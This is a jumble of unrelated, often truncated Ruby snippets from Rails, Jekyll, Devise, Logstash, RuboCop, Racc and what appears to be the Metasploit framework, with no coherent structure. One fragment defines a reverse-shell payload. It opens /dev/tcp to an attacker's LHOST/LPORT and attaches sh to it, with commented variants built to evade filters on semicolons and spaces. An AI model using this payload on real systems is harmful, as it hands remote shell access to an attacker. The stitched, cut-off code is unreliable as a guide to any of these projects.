
        
          # Specifies the header that your server uses for sending files.
  # config.action_dispatch.x_sendfile_header = 'X-Sendfile' # for Apache
  # config.action_dispatch.x_sendfile_header = 'X-Accel-Redirect' # for NGINX
    
        assert_equal <<~MESSAGE, run_routes_command
                                     Prefix Verb   URI Pattern                                                                              Controller#Action
              rails_mandrill_inbound_emails POST   /rails/action_mailbox/mandrill/inbound_emails(.:format)                                  action_mailbox/ingresses/mandrill/inbound_emails#create
              rails_postmark_inbound_emails POST   /rails/action_mailbox/postmark/inbound_emails(.:format)                                  action_mailbox/ingresses/postmark/inbound_emails#create
                 rails_relay_inbound_emails POST   /rails/action_mailbox/relay/inbound_emails(.:format)                                     action_mailbox/ingresses/relay/inbound_emails#create
              rails_sendgrid_inbound_emails POST   /rails/action_mailbox/sendgrid/inbound_emails(.:format)                                  action_mailbox/ingresses/sendgrid/inbound_emails#create
               rails_mailgun_inbound_emails POST   /rails/action_mailbox/mailgun/inbound_emails/mime(.:format)                              action_mailbox/ingresses/mailgun/inbound_emails#create
             rails_conductor_inbound_emails GET    /rails/conductor/action_mailbox/inbound_emails(.:format)                                 rails/conductor/action_mailbox/inbound_emails#index
                                            POST   /rails/conductor/action_mailbox/inbound_emails(.:format)                                 rails/conductor/action_mailbox/inbound_emails#create
          new_rails_conductor_inbound_email GET    /rails/conductor/action_mailbox/inbound_emails/new(.:format)                             rails/conductor/action_mailbox/inbound_emails#new
         edit_rails_conductor_inbound_email GET    /rails/conductor/action_mailbox/inbound_emails/:id/edit(.:format)                        rails/conductor/action_mailbox/inbound_emails#edit
              rails_conductor_inbound_email GET    /rails/conductor/action_mailbox/inbound_emails/:id(.:format)                             rails/conductor/action_mailbox/inbound_emails#show
                                            PATCH  /rails/conductor/action_mailbox/inbound_emails/:id(.:format)                             rails/conductor/action_mailbox/inbound_emails#update
                                            PUT    /rails/conductor/action_mailbox/inbound_emails/:id(.:format)                             rails/conductor/action_mailbox/inbound_emails#update
                                            DELETE /rails/conductor/action_mailbox/inbound_emails/:id(.:format)                             rails/conductor/action_mailbox/inbound_emails#destroy
      rails_conductor_inbound_email_reroute POST   /rails/conductor/action_mailbox/:inbound_email_id/reroute(.:format)                      rails/conductor/action_mailbox/reroutes#create
                         rails_service_blob GET    /rails/active_storage/blobs/:signed_id/*filename(.:format)                               active_storage/blobs#show
                  rails_blob_representation GET    /rails/active_storage/representations/:signed_blob_id/:variation_key/*filename(.:format) active_storage/representations#show
                         rails_disk_service GET    /rails/active_storage/disk/:encoded_key/*filename(.:format)                              active_storage/disk#show
                  update_rails_disk_service PUT    /rails/active_storage/disk/:encoded_token(.:format)                                      active_storage/disk#update
                       rails_direct_uploads POST   /rails/active_storage/direct_uploads(.:format)                                           active_storage/direct_uploads#create
    MESSAGE
  end
    
        # Read all the content files from <source>/<dir>/magic_dir
    #   and return them with the type klass.
    #
    # dir - The String relative path of the directory to read.
    # magic_dir - The String relative directory to <dir>,
    #   looks for content here.
    # klass - The return type of the content.
    #
    # Returns klass type of content files
    def read_content(dir, magic_dir, matcher)
      @site.reader.get_entries(dir, magic_dir).map do |entry|
        next unless entry =~ matcher
    
              @highlighter = begin
            if @config.key?('enable_coderay') && @config['enable_coderay']
              Jekyll::Deprecator.deprecation_message(
                'You are using 'enable_coderay', ' \
                'use syntax_highlighter: coderay in your configuration file.'
              )
    
          Jekyll.logger.info '', 'and done. Generating results..'
      Jekyll.logger.info ''
    end
    
    def liquid_escape(markdown)
  markdown.gsub(%r!(`{[{%].+[}%]}`)!, '{% raw %}\\1{% endraw %}')
end
    
    require 'jekyll'
require 'mercenary'
    
              theme.create!
          Jekyll.logger.info 'Your new Jekyll theme, #{theme.name.cyan},' \
                             ' is ready for you in #{theme.path.to_s.cyan}!'
          Jekyll.logger.info 'For help getting started, read #{theme.path}/README.md.'
        end
        # rubocop:enable Metrics/AbcSize
      end
    end
  end
end

    
    class Devise::ConfirmationsController < DeviseController
  # GET /resource/confirmation/new
  def new
    self.resource = resource_class.new
  end
    
              path
        end
      end
    
          # Checks whether the user session has expired based on configured time.
      def timedout?(last_access)
        !timeout_in.nil? && last_access && last_access <= timeout_in.ago
      end
    
        ret << '\r\n'
  end
    
      #
  # Returns the command string to use for execution
  #
  def command_string
    fd = rand(200) + 20
    return '0<&#{fd}-;exec #{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']};sh <&#{fd} >&#{fd} 2>&#{fd}';
    # same thing, no semicolons
    #return '/bin/bash #{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} <&#{fd} >&#{fd}'
    # same thing, no spaces
    #return 's=${IFS:0:1};eval$s\'bash${s}#{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']}$s<&#{fd}$s>&#{fd}&\''
  end
end

    
      #
  # Overrides the builtin 'each' operator to avoid the following exception on Ruby 1.9.2+
  #    'can't add a new key into hash during iteration'
  #
  def each(&block)
    list = []
    self.keys.sort.each do |sidx|
      list << [sidx, self[sidx]]
    end
    list.each(&block)
  end
    
          when IAX_CTRL_BUSY
        dprint('BUSY')
        self.busy  = true
        self.state = :hangup
        self.client.send_ack(self)
    
      #
  # Payload types were identified from xCAT-server source code (IPMI.pm)
  #
  PAYLOAD_IPMI = 0
  PAYLOAD_SOL  = 1
  PAYLOAD_RMCPPLUSOPEN_REQ = 0x10
  PAYLOAD_RMCPPLUSOPEN_REP = 0x11
  PAYLOAD_RAKP1 = 0x12
  PAYLOAD_RAKP2 = 0x13
  PAYLOAD_RAKP3 = 0x14
  PAYLOAD_RAKP4 = 0x15
    
      def self.create_ipmi_rakp_1(bmc_session_id, console_random_id, username)
    head = [
      0x06, 0x00, 0xff, 0x07,  # RMCP Header
      0x06,                    # RMCP+ Authentication Type
      PAYLOAD_RAKP1,           # Payload Type
      0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00,
    ].pack('C*')
    
              # Encodes the Rex::Proto::Kerberos::CredentialCache::Time into an String
          #
          # @return [String] encoded time
          def encode
            encoded = ''
            encoded << encode_auth_time
            encoded << encode_start_time
            encoded << encode_end_time
            encoded << encode_renew_time
    
              # Encodes the msg_type field
          #
          # @return [OpenSSL::ASN1::Integer]
          def encode_msg_type
            bn = OpenSSL::BN.new(msg_type.to_s)
            int = OpenSSL::ASN1::Integer.new(bn)
    
    testdata( File.dirname($0) + '/scandata', ARGV ).each do |file|
  $stderr.print File.basename(file) + ': '
  begin
    ok = File.read(file)
    s = Racc::GrammarFileScanner.new( ok )
    sym, (val, _lineno) = s.scan
    if printonly then
      $stderr.puts
      $stderr.puts val
      next
    end
    
    describe 'GzipReader#getc' do
    
        gz.pos.should == 0
    
      before :each do
    @z = Zlib::Inflate.new
  end
    
            if LogStash::PluginMetadata.exists?(plugin_id.to_s)
          plugin_metadata = LogStash::PluginMetadata.for_plugin(plugin_id.to_s)
          cluster_uuid = plugin_metadata&.get(:cluster_uuid)
          segment[:cluster_uuid] = cluster_uuid unless cluster_uuid.nil?
        end
    
          linux_host_os.each do |host|
        it '#{host} returns false' do
          allow(LogStash::Environment).to receive(:host_os).and_return(host)
          expect(LogStash::Environment.linux?).to be_truthy
        end
      end
    end
  end
end

    
        File.join(basedir, 'config', 'startup.options').tap do |path|
      dir.input('#{path}=/etc/logstash')
    end
    File.join(basedir, 'config', 'jvm.options').tap do |path|
      dir.input('#{path}=/etc/logstash')
    end
    File.join(basedir, 'config', 'logstash.yml').tap do |path|
      dir.input('#{path}=/etc/logstash')
    end
    File.join(basedir, 'config', 'logstash-sample.conf').tap do |path|
      dir.input('#{path}=/etc/logstash')
    end
    File.join(basedir, 'pkg', 'pipelines.yml').tap do |path|
      dir.input('#{path}=/etc/logstash')
    end
    
    RSpec.describe RuboCop::AST::IfNode do
  let(:if_node) { parse_source(source).ast }
    
          def remove_files(files, dirs, remove_count)
        # Batch file deletions, deleting over 130,000+ files will crash
        # File.delete.
        files[0, remove_count].each_slice(10_000).each do |files_slice|
          File.delete(*files_slice)
        end
        dirs.each { |dir| Dir.rmdir(dir) if Dir['#{dir}/*'].empty? }
      end
    end